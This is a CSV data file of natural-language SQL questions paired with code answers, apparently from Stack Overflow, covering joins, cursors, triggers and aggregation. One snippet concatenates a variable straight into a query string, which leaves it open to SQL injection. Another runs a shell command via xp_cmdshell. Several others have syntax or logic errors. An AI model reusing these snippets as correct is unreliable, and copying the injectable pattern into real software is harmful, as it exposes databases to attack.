,Unnamed: 0,NL,Code
38648,3004,"Add dynamic values in sql where clause, but its not working","var mySQL = ""SELECT SUM(amount1) AS OrderTotal FROM budget1 WHERE month='""+hello+""'"";

transaction.executeSql(mySQL, [], dataSelectHandler, errorHandler);
"
13014,67651,"I want to update values in column, based on condition that need to compare data from another table","UPDATE CLIENTS
SET DIFFERENCE = CASE WHEN EXISTS
                 (SELECT 1 FROM DOCUMENT
                  WHERE ID_CLIENT = CLIENTS.ID_CLIENT
                  AND MONTHS_BETWEEN(TO_DATE(DATA,'MM/DD/YYYY'),SYSDATE) > 4) 
                 THEN 'Above' 
                 ELSE 'Below' END
"
8464,38367,Add row that is duplicate except for one column,"INSERT INTO `<table>` (column1, column2, ...)
SELECT 'Jim', column2, ... FROM ... WHERE ...
"
32460,70353,Two SK's in one table,"SELECT CURRENCY_SK_FROM,
       (SELECT CURRENCY_NAME
            FROM CURRENCY
            WHERE CURRENCY_SK = CURRENCY_SK_FROM) AS CURRENCY_NAME,
       CURRENCY_SK_TO,
       (SELECT CURRENCY_NAME
            FROM CURRENCY
            WHERE CURRENCY_SK = CURRENCY_SK_TO) AS CURRENCY_NAME_TO,
       CONVERSION_RATE
    FROM CONVERSION_RATE_TABLE;
"
33432,24287,Only select items where a table contains two specific values,"SELECT j.id
FROM journey j JOIN
     journey_day jd
     ON jd.journey = j.id JOIN
     pattern p
     ON p.id = j.pattern JOIN
     pattern_link pl
     ON pl.section = pattern.section
WHERE p.service = :service AND p.direction = :direction AND jd.day = :day
GROUP BY j.id
HAVING sum(p.busstop = :arrival) > 0 and
       sum(p.busstop = :departure) > 0;
"
4170,69060,Can I use SELECT statement inside INSERT values?,"INSERT
INTO    tbl_vaucher (vaucher_name, created_date)
SELECT  TOP 1
        con_full_name, GETDATE()
FROM    tbl_contact
"
11008,63888,SQL - Call Stored Procedure for each record,"DECLARE @oneid int -- or the appropriate type

DECLARE the_cursor CURSOR FAST_FORWARD
FOR SELECT spro.Id  
    FROM SomeTable as spro 
        INNER JOIN [Address] addr ON addr.Id = spro.Id  
        INNER JOIN City cty ON cty.CityId = addr.CityId 
    WHERE cty.CityId = @CityId

OPEN the_cursor
FETCH NEXT FROM the_cursor INTO @oneid

WHILE @@FETCH_STATUS = 0
BEGIN
    EXEC UpdateComputedFullText @oneid

    FETCH NEXT FROM the_cursor INTO @oneid
END

CLOSE the_cursor
DEALLOCATE the_cursor
"
32644,718,Merging multiple oracle queries to produce one result,"select * from
(select count(*) from tableA),
(select count(*) from tableB),
(select count(*) from tableC),
(select count(*) from tableD);
"
31370,22361,Vertica SQL insert multiple rows in one statement,"insert into analytics.bw_covariance_matrix 
SELECT 1, 4.01926965, -0.4686067, -0.07592112
UNION
SELECT 2, -0.46860675,  4.1799267, -0.82461139
UNION
SELECT 3, -0.07592112, -0.8246114,  4.37186211
"
9952,64691,JOIN in SQL with one-to-many relationship,"SELECT
    r.*,c.*
    FROM reps r
        LEFT OUTER JOIN (SELECT
                             rep_id,MAX(commentDate) AS MaxDate
                             FROM comments
                             GROUP BY rep_id
                        ) m On r.rep_id=m.rep_id
        LEFT OUTER JOIN comments c ON r.rep_id=c.rep_id AND m.MaxDate=c.commentDate
    ORDER BY r.rep_name
"
18031,11828,Selecting specific data based on multiple conditions,"WITH cte 
     AS (SELECT date, 
                name, 
                number, 
                rn = Row_number () 
                       OVER( 
                         partition BY date, name 
                         ORDER BY number DESC) 
         FROM   dbo.tablename) 
SELECT date, 
       name, 
       number 
FROM CTE
WHERE  rn = 1 
ORDER  BY date ASC
"
15151,31285,Oracle SQL Find Highest ID Across All Tables,"SQL> set serveroutput on
SQL> declare
  2      l_id pls_integer;
  3      max_id pls_integer;
  4      max_tab_name varchar2(30);
  5  begin
  6      max_id := 0;
  7      for r in ( select table_name
  8                 from user_tab_columns
  9                 where column_name = 'ID' )
 10      loop
 11          execute immediate 'select max(id) from '||r.table_name
 12              into l_id;
 13          if l_id > max_id
 14          then
 15              max_id := l_id;
 16              max_tab_name := r.table_name;
 17          end if;
 18      end loop;
 19      dbms_output.put_line('Highest score = '||max_id||' table='||max_tab_name);
 20  end;
 21  /
Highest score = 2010070705 table=SESSIONS

PL/SQL procedure successfully completed.

SQL>
"
17276,178,SQL Server Ordering Based on two columns - parent and child,"select primary, secondary
from (select t.primary, t.secondary,
             max(case when tsub.primary is not null then 1 else 0 end) as hasprimary
      from t left outer join
           t tsub
           on t.secondary = t.primary
      group by t.primary, t.secondary
     ) a
order by (case when hasprimary = 1 then secondary else primary end),
         hasprimary desc,
         secondary
"
8920,35373,How to write a SQL query to insert from a triple many-to-one relationship to a many-to-many relationship?,"declare @idC table(id int)
declare @fkeyC int, @fkeyA1 int, @fkeyA2 int, @fkeyA3 int, @name varchar(8)
declare CursorB cursor fast_forward for select fkeyA1, fkeyA2, fkeyA3, name from TableB
open CursorB
fetch next from CursorB into @fkeyA1, @fkeyA2, @fkeyA3, @name
while @@fetch_status = 0
begin
    insert into TableC(name) output inserted.id into @idC values (@name)
    set @fkeyC = (select top 1 id from @idC)
    insert into TableD(fkeyC, fkeyA) values (@fkeyC, @fkeyA1), (@fkeyC, @fkeyA2), (@fkeyC, @fkeyA3)
    delete from @idC
    fetch next from CursorB into @fkeyA1, @fkeyA2, @fkeyA3, @name
end
close CursorB
deallocate CursorB
"
23360,70718,Insert local .csv data in remote SQL Server via already working connection string,"#!/usr/bin/perl

# PERL MODULES
use strict;
use DBI;
use DBD::ODBC;
use Text::CSV;
use List::MoreUtils qw(each_array);

# SOME VARIABLES
my $file = '/tmp/Stevo/clientlist.csv';
my $csv = ();
my $fh = ();
my $data_source = q/dbi:ODBC:MSSQLServer/;
my $user = q/username/;
my $password = q/password/;

# WRITE HOSTNAMES FROM CSV TO ARRAY
my @hostnames;
open (my $csv, '<', $file) || die ""cant open"";
foreach (<$csv>) {
   chomp;
   my @fields = split(/\,/);
   push @hostnames, $fields[0];
}
# WRITE CLIENTVERSIONS FROM CVS ARRAY
my @clientversions;
open (my $csv, '<', $file) || die ""cant open"";
foreach (<$csv>) {
   chomp;
   my @fields = split(/\,/);
   push @clientversions, $fields[1];
}
# CONNECTION STRING
my $dbh = DBI->connect($data_source, $user, $password, {RaiseError => 0, PrintError => 1}) or die ""Can't connect to $data_source: $DBI::errstr"";

# INSERTION CODE
my $sth_insert = $dbh->prepare('INSERT INTO dbo.LegatoClients (ClientName, ClientVersion) VALUES (?, ?)')
  or die $dbh->errstr;
   # EVERYTIME $EA IS CALLED THE NEXT LINE OF THE ARRAYS WILL BE RETURNED 
my $ea = each_array(@hostnames, @clientversions);
   # SET VALUES USING THE EVERYTIME ARRAY
while ( my ($val_hostnames, $val_clientversions) = $ea->() ) {
  $sth_insert->execute($val_hostnames, $val_clientversions) or die $dbh->errstr;
}
"
25780,28676,Update Columns Where The Parameter Has Been Supplied From Code,"SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE PROCEDURE sp_UpdateTable

    @TableID int,
    @StartTime1 datetime,
    @StartTime1Specified BIT,
    @EndTime1 datetime,
    @EndTime1Specified BIT

AS
BEGIN
    SET NOCOUNT ON;

    UPDATE [Table]
       SET [StartTime1] = (CASE WHEN @StartTime1Specified = 1 THEN @StartTime1 ELSE [StartTime1] END)
          ,[EndTime1]   = (CASE WHEN @EndTime1Specified = 1 THEN @EndTime1 ELSE [EndTime1])
    WHERE TableID = @TableID
END
GO
"
30415,74093,How to create crosstab queries in PostgreSQL,"SELECT sampling_point, time_sampling,
       CASE WHEN sampling_point = 'floor' THEN entero ELSE NULL END AS entero_floor,   
       CASE WHEN sampling_point = 'wall' THEN entero ELSE NULL END AS entero_wall
FROM SourceTable
ORDER BY sampling_point DESC;
"
31557,63271,Access SQL: Choosing which table to SELECT from based on a condition,"SELECT *
FROM Attendance 
WHERE ([a checkbox on a form that indicates whether the user wants the condition] and condition) or
      (not [a checkbox on a form that indicates whether the user wants the condition] )
"
38378,17711,"Selecting id (in this case dupersid) where value from the second column (in this case icd9codx) is in (296, 311) and 250 only","SELECT * 
FROM public.sample_test 
WHERE dupersid IN(SELECT dupersid FROM public.sample_test
                  GROUP BY dupersid
                  HAVING SUM(CASE icd9codx WHEN 250 THEN 1
                                           WHEN 296 THEN 2 
                                           WHEN 311 THEN 4
                                           ELSE 8 END) IN (3, 5) AND
                         SUM(CASE WHEN icd9codx = 250 THEN 1  
                                  ELSE 0 END) = 1)
"
2701,843,Unable to set ID column in case of left outer join,"select 1 as ID,
       C.RowID,
       C.Position,
       F.Data
from tblComplete as C
  left outer join tblFiltered as F
    on C.Position = F.Position
order by C.RowID, C.Position
"
23218,65838,Query to return text if row is null from oracle db,"SELECT nvl(paramOne, 0), nvl(trim(paramTwo), 'EMPTY')
FROM tableName
WHERE search_param = 'x'
"
30693,58826,SQL COUNT - Output table with two COUNT columns with differing WHERE clauses,"select associated_project as project,
count(case when issue_status='OPEN' then 1 else null end) as open_issue_count,
count(case when issue_status='CLOSED' then 1 else null end) as closed_issue_count
from table
group by associated_project;
"
30392,49315,SQL XQuery and Cross Apply problems...too many rows in results,"WITH XMLNAMESPACES('http://schemas.datacontract.org/2004/07/Zeller.Gp' AS ZC, 
    'http://schemas.datacontract.org/2004/07/Zynergy' AS ZYN)

SELECT Contract, LineName.value('.', 'varchar(50)') as LineItemName, ProjName.value('.', 'varchar(50)') as ProjectName
FROM @contract AS CM 
CROSS APPLY CM.FullContract.nodes('/ZC:ZEstimateContract/ZC:_projects/ZC:ZEstimateProject/ZYN:Name') as Proj(ProjName)
CROSS APPLY Proj.ProjName.nodes('../ZC:_lines/ZC:ZEstimateLine/ZYN:Name') as Line(LineName)
"
15929,49505,Insert row with id into a table with auto increment on,"INSERT #1 --created id 1
INSERT #2 --created 2
INSERT #3 -- created 3
DELETE 2 --2 gone, leaves a gap
set identity_insert your_table on
INSERT VALUES ( 2, ... ) -- filled gap again
set identity_insert your_table off
"
30268,8620,Select records / count distinct from another table,"SELECT
    S.GameID,
    S.LeagueID,
    S.SeasonID, 
    S.DatePlayed, 
    S.TimePlayed, 
    S.HomeTeamID, 
    S.VisitorTeamID, 
    HomeTeam.TeamName AS HomeTeamName, 
    VisitorTeam.TeamName AS VisitorTeamName,
    CASE WHEN gs.GameID IS NULL THEN 'False' ELSE 'True' END AS HasGameStats
FROM schedules S
INNER JOIN teams AS HomeTeam ON S.HomeTeamID = HomeTeam.TeamID   
INNER JOIN teams AS VisitorTeam ON S.VisitorTeamID = VisitorTeam.TeamID
    LEFT JOIN GameStats gs ON s.GameID = gs.GameID
WHERE S.LeagueID = <cfqueryparam value=""#application.leagueid#"" cfsqltype=""cf_sql_integer"">
    AND S.SeasonID = <cfqueryparam value=""#application.seasonid#"" cfsqltype=""cf_sql_integer"">
ORDER BY S.GameID DESC
"
20195,35759,Pick Values from Grouped Rows in Postgres,"Select Z.Code, Z.PrevCode
From (
     Select Id, Code, Year
        , lag( Code, 1 ) Over ( Partition By Id Order By Year ) As PrevCode
     From tbl
     Where Year In(2016,2015)
     ) As Z
Where Z.Year = 2016
"
740,3304,Copy data from one table to another- Oracle,"declare
newId number;
begin
select nvl(max(person.pk),0) + 1 into newId from person;
for x in (
    select w.Name, p.Address
    from wife w inner join Person p
    on w.Person_id = P.pk) loop
   insert into Person(pk, Name,Address,Is_Married) values (newId ,x.Name ,x.Address,'Y');
   newId := newId  +1;
end loop;
commit;
end
"
15000,70189,"In Mongo, how do I find all the documents, but display only their titles?","db.Books.find({ISBN : ""1234567890"" }, { title : 1 } );
"
24332,503,Select Users who have made the most positive contributions,"select 
     count(artc_status) as stats , 
     count(case when artc_status=1 then 1 end) Positive,      
     artc_user[Contributing User] 
from 
    contributions 
group by 
    artc_user 
order by  stats desc;
"
23869,56971,Mysql insert new row,"select * from table order by (id=4) DESC,id ASC
"
30085,5657,MySQL Query get total number of guests per company,"select 
    first_name,
    last_name,
    c.name as company_name,
    sc.date as screening_date,
    (
       select count(*) from guests
       inner join 
          user_guest_group  on user_guest_group.guest_id = guests.id
       inner join 
          companies  on companies.id = guests.company_id
       inner join
          screening_date_guest  on screening_date_guest.guest_id = guests.id
       inner join
          screening_dates  on screening_dates.id = screening_date_guest.screening_date_id
       where 
          screening_date_guest.attending = 1
       and  
          screening_date_id = 1 and company_id = c.id
    ) total_guests
from
    guests g
inner join 
    user_guest_group ugs on ugs.guest_id = g.id
inner join 
    companies c on c.id = g.company_id
inner join
    screening_date_guest sdg on sdg.guest_id = g.id
inner join
    screening_dates sc on sc.id = sdg.screening_date_id
where 
    sdg.attending = 1
and  
    screening_date_id = 1
group by
    first_name,
    last_name,
    c.id,
    c.name,
    sc.date 
"
34326,64052,Filter out the duplicates based on a group in SQL,"select parent_id, min(child_id), color
from your_tab
group by parent_id, color;
"
7267,69959,How to count the occurrences of a value in a row based on a WHERE condition?,"select ID,sum(i_count) as unpaid_count
from
(
select ID ,case when Jan = 'PAID' then 0 else 1 end as i_count,1 as month_no
from payments
union all
select ID, case when Feb = 'PAID' then 0 else 1 end ,2
from payments  
union all
select ID, case when Mar = 'PAID' then 0 else 1 end ,3
from payments
union all
select ID, case when Apr = 'PAID' then 0 else 1 end ,4
from payments 
union all
..
) A 
Where month_no <= strftime('%m', date('now')) 
"
37052,53768,Update subset of data in sqlserver,"UPDATE tb_Contact
SET ContactAssociate = 'Peter'
where PK_Of_tb_Contact
IN
(
SELECT TOP 14 PK_Of_tb_Contact
FROM tb_Contact 
WHERE tb_Contact.ContactAssociate = 'David' 
ORDER BY NEWID()
)
"
30507,26049,sql declare variable string and use in where clause,"DECLARE @midname varchar(200); 
SET @midname = 'Lara'; 
SELECT Replace(Replace(Names,@midname,''),'M',''); 
"
13562,61391,Two Trigger of same type on same table which will get executed first?,"create trigger TR2
after insert on table1
for each row
follows TR1 -------------------------------------------------<<
begin
 ...
end;
"
11446,44477,JOIN query with IN operator,"SELECT P.* 
FROM wp_posts AS P
INNER JOIN wp_comments AS C ON C.post_ID = P.post_ID
WHERE C.comment_ID IN (2, 4, 6, 7);
"
21238,27930,Resolve hostnames with t-sql,"exec master..xp_cmdshell 'nslookup intel.com'
"
28445,19125,Query with Chinese values,"sqlCommand.CommandText = ""insert into ExampleTable values(N'发现',N'发现',N'发现')""
"
2273,40683,Return Auto Increment value after inserting a record on a table,"DECLARE @NewID int

INSERT INTO User ([UserFirstName], [UserSurname], [UserDob]) Values ('Bob', 'Smith', '1979-01-01')

Select @NewID = SCOPE_IDENTITY()


INSERT INTO OtherTable ([UserId]) Values (@NewID)
"
9541,7966,Teradata stored procedure with dynamic parameters called from R script,"CREATE PROCEDURE procTest4 (IntN INTEGER)
DYNAMIC RESULT SETS 1
BEGIN
   DECLARE SqlStr VARCHAR(1000);
   DECLARE rslt CURSOR WITH RETURN ONLY FOR stmt;
   SET SQLStr = 'SELECT top ' || IntN || ' * from TableName';
   PREPARE stmt FROM SqlStr;
   OPEN rslt;
END;
"
14143,64566,View Image in One activity using SqlLite Database,"public class MainActivity extends Activity {

int imgNumber = 1;
...

ImageView imgView = (ImageView)findViewById(R.id.imageview);

imgView.setImageResource(R.drawable.image1);

...

next.setOnClickListener(new OnClickListener() {


        @Override
        public void onClick(View v) {

        if (imgNumber==0) {
          imgView.setImageResource(R.drawable.image1);
          imgNumber++;
        } else if(imgNumber==1) {
          imgView.setImageResource(R.drawable.image2);
          imgNumber++;
        } else if(imgNumber==2) {
          imgView.setImageResource(R.drawable.image3);
          imgNumber++;
        } else if(imgNumber==3) {
          imgView.setImageResource(R.drawable.image4);
          imgNumber++;
        } else if(imgNumber==4) {
          imgView.setImageResource(R.drawable.image5);
          imgNumber = 0;
        }

        }
});
...
}
"
11789,35924,Oracle if statement in where clause,"Where ...
  AND 
    (
        (TO_CHAR(:DATEINPUT, 'DAY') = 'SATURDAY' AND TO_CHAR(Q.DATE_INSERTED, 'DD') = TO_CHAR(:DATEINPUT-1, 'DD'))
        OR 
        (TO_CHAR(:DATEINPUT, 'DAY') = 'SUNDAY' AND TO_CHAR(Q.DATE_INSERTED, 'DD') = TO_CHAR(:DATEINPUT-2, 'DD'))
    )
    AND ...
"
17630,241,How do I filter a history table for items that had a specific status but exclude that item if it also had another specific status,";With RecentStatuses As 
(
    Select  FK_JobId, MaterStatus, Max(Updated) Recent
    From    @History
    Group by FK_JobID, MaterStatus
)
Select  H1.FK_JobID
From    RecentStatuses  H1
Where   H1.MaterStatus = 'Issued'
And Not Exists
(
    Select  *
    From    RecentStatuses  H2
    Where   H2.FK_JobID = H1.FK_JobID
    And     H2.MaterStatus = 'Revoked'
    And     H2.Recent >= H1.Recent
)
"
8352,31352,Can I lock rows in a cursor if the cursor only returns a single count(*) row?,"alter table dept add (manager_count integer default 0 not null,
   constraint manager_count_chk check (manager_count <= 3));

create trigger emp_trg
before insert or update or delete on emp
for each row
begin
    if inserting or updating then
        if :new.job = 'MANAGER' then
            update dept
            set    manager_count = manager_count+1
            where  deptno = :new.deptno;
        end if;
    end if;
    if updating or deleting then
        if :old.job = 'MANAGER' then
            update dept
            set    manager_count = manager_count-1
            where  deptno = :new.deptno;
        end if;
    end if;
end;
"
5746,45180,Aggregating based on buckets sql,"select ltvBucket, CrateBucket,
       avg(SavRate), avg(SavIncentive), sum(PartialPrepay)
from (select t.*,
             (case when ltv between 0.0 and 0.2 then 'LTV:0.0-0.2'
                   when ltv between 0.2 and 0.4 then 'LTV:0.2-0.4'
                   when ltv between 0.4 and 0.6 then 'LTV:0.4-0.6'
                   when ltv between 0.6 and 0.8 then 'LTV:0.6-0.8'
                   else 'LTV:other'
             end) as ltvbucket,
            (case when Crate between 2 and 4 then 'Crate:2-4'
                  when Crate between 4 and 6 then 'Crate:4-6'
                  when Crate between 6 and 8 then 'Crate:6-8'
                  else 'Crate:Other'
            end) as CrateBucket
      from t
     ) t
group by ltvBucket, CrateBucket
"
739,36731,MySQL to group a column's values to a single cell value,"select column1, column2, column3, column4, column5, group_concat(column6) as column6
from query q
group by column1, column2, column3, column4, column5;
"
37534,31758,replacing field in Oracle SQL with join not working,"SELECT   
  client.title AS TITLE, 
  COUNT(SUBSTR(activity, INSTR(activity, '/', 1, 4) + 1, INSTR(activity, '/', 1, 5) - INSTR(activity, '/', 1, 4)-1)) AS DOWNLOADS 
FROM
  access_log
  JOIN client
    ON client.id = access_log.id
WHERE
  client.id = 5555
  AND time_stamp BETWEEN TO_DATE ('2014/05/01', 'yyyy/mm/dd') AND TO_DATE ('2014/10/31', 'yyyy/mm/dd') 
GROUP BY SUBSTR(activity, INSTR(activity, '/', 1, 4) + 1, INSTR(activity, '/', 1, 5) - INSTR(activity, '/', 1, 4) -1) 
ORDER BY DOWNLOADS DESC;
"
20303,14351,sql update procedure,"if (exVal is null) then tempExclude := 'Y' else tempExclude := NULL;
Update mbddx_animal
set exclude = tempExclude where...
"
27706,22781,sql tricky query with distinct,"SQL Statement
SELECT  a.rec_type
        , COUNT(*) as count_distinct
        , a.time_key as hour
FROM    (        
          SELECT a.rec_type
                  , a.a_tel_id
                  , a.time_key
          FROM    v_f_Logicacdrs21 a        
          GROUP BY
                  a.rec_type
                  , a.a_tel_id
                  , a.time_key
        ) a                  
GROUP BY
        a.rec_type
        , a.time_key
"
6672,55884,Check if table exists in the database - PL SQL,"select tname from tab where tname = 'TABLE_NAME_TO_SEARCH_FOR';
"
30069,67891,SQL Favorite Color Quiz,"select y.COLOR, count(*) as COUNT
from (select USER, min(ORDER) as ORDER from TheTable group by USER) x
inner join TheTable y on x.USER = y.USER and x.ORDER = y.ORDER
group by COLOR
"
21204,21475,SQL table function or means to tell if identity column has been used?,"SELECT IDENT_SEED(TABLE_NAME) AS Seed,
    IDENT_INCR(TABLE_NAME) AS Increment,
    IDENT_CURRENT(TABLE_NAME) AS Current_Identity,
    TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE OBJECTPROPERTY(OBJECT_ID(TABLE_NAME), 'TableHasIdentity') = 1
    AND TABLE_TYPE = 'BASE TABLE'
"
9579,64055,SQL : Return column value based on previous few rows values,"SELECT 
    [NAME]
  , [TIME]
  , (SELECT MAX(IsTrue+0) FROM TABLE1 it WHERE DATEADD(DD,1,it.TIME) > ot.TIME AND it.TIME <= ot.Time) [ISTRUE]
FROM Table1 ot
"
37287,28628,SQL - Counts not returning zeros,"SELECT mem.member_id, mem.screen_name, mem.firstname, mem.lastname, mem.country_code,  
mem.joined, rep.rep as reputation, IFNULL(com.cnt,0) as comments FROM members AS mem 
LEFT OUTER JOIN ( 
    SELECT member_id, SUM(awarded_what) as rep 
    FROM members_reputation 
    GROUP BY member_id) rep 
    ON mem.member_id = rep.member_id 
LEFT OUTER JOIN ( 
    SELECT member_id, COUNT(comment_id) as cnt 
    FROM blog_comments 
    GROUP BY comment_id) com 
    ON mem.member_id = com.member_id 
GROUP BY mem.member_id 
ORDER BY mem.joined DESC 
"
33791,52217,Multiple conditions on select query,"SELECT pr.Volume_UOM
 ,pr.Length_mm*pr.Width_mm*pr.Height_mm AS Volume_Cubic
 ,pr.Length_mm*pr.Width_mm AS Volume_Floor
 ,pr.Length_mm
 ,pr.Height_mm
 ,pr.Width_mm
FROM CostToServe_MCB.staging.Sale sa
LEFT JOIN staging.Product pr
ON sa.ID = pr.ID
and pr.Length_mm is not null
and pr.Width_mm is not null
and pr.Height_mm is not null
"
2955,44930,Find all stored procedures with particular starting name,"SELECT o.name
FROM sysobjects AS o
INNER JOIN sysprocedures AS p ON o.id = p.id
WHERE o.name LIKE ""ABC%""
"
23140,7937,oracle table is not locked,"LOCK TABLE countries 
    IN EXCLUSIVE MODE 
    NOWAIT;
"
28952,49325,Copy data between two columns using where with SQL,"UPDATE table SET two = one WHERE LENGTH(one) = 2
"
1221,39537,MySQL Selecting from multiple rows,"SELECT
    p.*,
    j.company_id as companyid,        
    f.id IS NOT NULL AS jid,
    p.id as pid,
    f.id AS fave_id,
    f.id IS NOT NULL AS fave
FROM people p  
LEFT JOIN job j 
       ON j.id = p.job_id
LEFT JOIN favourites f 
       ON f.people_id=p.id
      AND f.user_id = 12
WHERE p.company_id = 3
ORDER BY p.id ASC
"
29980,56672,vb.net sql last inserted ID,"sql = ""INSERT INTO...;SELECT @@IDENTITY..."" 
Dim id = sqlCommand.ExecuteScalar(sql)
"
35743,11274,SUM data only when COUNT(*) > 0,"SELECT pr.[name], 
       SUM(COALESCE(qm.iscompleted,0)) AS count_yes,
       (case when COUNT(p.id) > 0 then 
             SUM(COALESCE(qm.iscompleted,1))
        else
             0 end) AS count_no,
       COUNT(p.id) AS tot
"
17404,44706,Is there any performance or functional difference between these two SQL statements?,"SELECT      
Location.ID, 
Location.Location, 
COUNT(Person.ID) As CountAdultMales
FROM        
Transactions 
INNER JOIN Location 
ON Transactions.FKLocationID = Location.ID 
INNER JOIN Person 
ON Transactions.FKPersonID = Person.ID 
WHERE
Transactions.Deleted = 0 AND
Person.Deleted = 0 AND
Location.Deleted = 0 AND 
Person.DateOfBirth < dateadd(year, datediff(year, 0, getdate())-17, 0) AND 
Person.Gender = 1
"
6040,25852,"how to ""re-validate"" a foreign constraint in oracle","ALTER TABLE issues ENABLE VALIDATE CONSTRAINT fk_client;
"
37311,38994,PL/SQL Array to CLOB,"declare 
 v_clob clob;
 v_xml xmltype;
begin
 select xmlagg(XMLELEMENT(""test"",xmlforest(id,val)))
 into v_xml
 from test;
 select v_xml.getclobval
 into v_clob
 from dual;
 dbms_output.put_line(v_clob);
end;
/
"
34385,57815,Recursive SQL and information on different level,"select connect_by_root cab
      , level, cab, niveau, entite, entite_parent, libelle
   from my_table
  where niveau = 2
  start with cab = 'XXX'
connect by prior entite_parent = entite
"
35628,11447,Get result from multiple tables in single SQL query,"SELECT AP.TERMNAME
    ,COUNT(DISTINCT AP.TERMID) AS tot
    ,COUNT(DISTINCT AI.CTYPE) AS event
    ,COUNT(DISTINCT CASE WHEN AI.CTYPE = 'event' THEN AI.CTYPE ELSE NULL END) AS page
FROM REPORT_API_USAGE AP
INNER JOIN REPORT_API_PAGES AI ON AP.TERMID = AI.TERMID
WHERE AI.CTYPE IN ( 'download', 'event' )
    AND AP.VOCID = '21'
GROUP BY AP.TERMNAME
"
34645,61299,sql - joining 3 tables on same column,"SELECT blogs.user_id,
       blogs.blog_id,
       blogs.blog_content, 
       users.user_id,
       users.name, 
       comments.comment_id,
       comments.blog_id,
       comments.user_id,
       comments.comment_content ,
       comment_writers.name as CommentUserName
FROM blogs 
LEFT JOIN users ON users.user_id = blogs.user_id 
LEFT JOIN comments ON comments.blog_id = blogs.blog_id
LEFT JOIN users AS comment_writers ON comment_writers.user_id = comments.user_id
WHERE blogs.blog_id = 2
"
16046,15589,query the two table for draw in one,"SELECT table1.email as Email, 
    table2.accesses as Acesses, 
    table1.attempts as Attempts
from table1 
INNER JOIN table2 
on table1.email = table2.email
"
29008,29941,select datetime without specifying the time part?,"SELECT * FROM stat_tps WHERE DATE(min_date) ='2013-06-12'
"
4965,39721,sql sum rows and put into columns of select," select
      person,
      sum(case activitycode when 1 then activityvalue else 0 end),
      sum(case activitycode when 2 then activityvalue else 0 end),
      ....
 from 
      yourtable
 group by
      person
"
12707,128,Flagging consecutive days in SQL,"select patient_id,
       max(case when date_trunc('day', date_noted) = date_trunc('day', prev_date_noted)
                then 1 else 0
           end) as IsConsecutiveFlag
from (select patient_id, date_noted,
             lag(date_noted) over (partition by patient_id order by date_noted) as prev_date_noted
      from t
     ) t
group by patient_id;
"
4143,41235,PostgreSQL ascending maxes by date,"SELECT t1.value
       ,t1.date
FROM Table1 AS t1
  LEFT JOIN Table1 AS t2
    ON t1.date > t2.date
GROUP BY 
  t1.id
HAVING
  max(t2.value) IS NULL 
  OR max(t2.value) < t1.value
ORDER BY t1.date;
"
33836,3332,Android Content Provider how to query with multiple selectionArg,"String selection1 = DatabaseOpenHelper.COLUMN_ID + "" in ("";
for (int i = 0; i < selectionArgs1.length; i++) {
    selection1 += ""?, "";}           
selection1 = selection1.substring(0, selection1.length() - 2) + "")"";            
getContentResolver().query(StudentContentProvider.CONTENT_URI1, projection1, selection1, selectionArgs1, null);
"
30419,8268,How can you query a SQL database for malicious or suspicious data?,"SELECT *
FROM MyTable
WHERE MyField LIKE '%[^a-z0-9]%'
"
7388,75076,Is there any way to speed up this query?,"SELECT mlscopy.listing_listnum 
FROM mlscopy A
NOT EXISTS
(
    SELECT *
    FROM mls_cvrmls B
    WHERE B.listing_listnum = A.listing_listnum
);
"
31955,74667,SQL select dates in future and not ending before until date,"SELECT * FROM shows s 
WHERE s.show_status = 'ENABLED'
AND 
(
  s.show_from >= CURRENT_DATE() 
  OR (s.show_from <= CURRENT_DATE() AND s.show_until >= CURRENT_DATE())
)
ORDER BY s.show_from ASC
"
30593,59919,GroupBy and SelectMany analogues in SQL?,"SELECT * 
FROM mytable
CROSS APPLY (
  SELECT * 
  FROM othertable
  WHERE instance_id = mytable.instance_id)
"
32309,27412,SQL: Concat a column with a limit?,"select city,
  state,
  substring_index(group_concat(stores SEPARATOR ', '), ', ', 2) stores
from yt                                                   -- ^ number of values to limit
group by city, state;
"
11301,18490,Heroku - SQL query return difference results on localhost and heroku,"db=# select current_date - interval '15' year;
      ?column?       
---------------------
 1997-04-26 00:00:00

db=# select current_date - interval '15'
        years        
---------------------
 2012-04-25 23:59:45

db=# select current_date - interval '15 year';
      ?column?       
---------------------
 1997-04-26 00:00:00
"
28521,11789,SQL: how to select single record for multiple id's on the basis of max datetime?,"SELECT        a.Id, a.WindSpeed, a.DateTime
FROM          YourTable AS a
INNER JOIN     
(
    SELECT    ID, Max(DateTime) AS DateTime
    FROM      YourTable
    GROUP BY  ID
) AS b
ON            a.ID = b.ID
AND           a.DateTime = b.DateTime
"
